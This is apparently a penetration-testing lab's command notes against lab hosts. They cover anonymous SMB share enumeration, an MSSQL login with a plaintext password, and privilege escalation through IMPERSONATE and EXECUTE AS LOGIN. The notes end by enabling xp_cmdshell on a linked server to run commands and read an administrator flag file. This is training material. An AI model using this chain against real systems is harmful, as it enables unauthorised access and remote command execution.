PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server

smbclient -N -L \\\\10.129.203.10
smbmap -H 10.129.203.10 -u null -p ''
crackmapexec smb 10.129.203.10 --shares

smbclient \\\\10.129.203.10\\Home
smbclient \\\\10.129.203.10\\IPC$

sqsh -S 10.129.251.81 -U .\\Fiona -P '48Ns72!bns74@S84NNNSl' 

1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

1> EXECUTE AS LOGIN = 'john'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

Identify linked Servers in MSSQL
1> SELECT srvname, isremote FROM sysservers
2> GO

EXECUTE('EXECUTE sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
EXECUTE('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
EXECUTE('EXECUTE sp_configure ''xp_cmdshell'', 1') AT [LOCAL.TEST.LINKED.SRV]
EXECUTE('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
EXECUTE('xp_cmdshell whoami') AT [LOCAL.TEST.LINKED.SRV]
EXECUTE('xp_cmdshell "type c:\users\administrator\desktop\flag.txt"') AT [LOCAL.TEST.LINKED.SRV]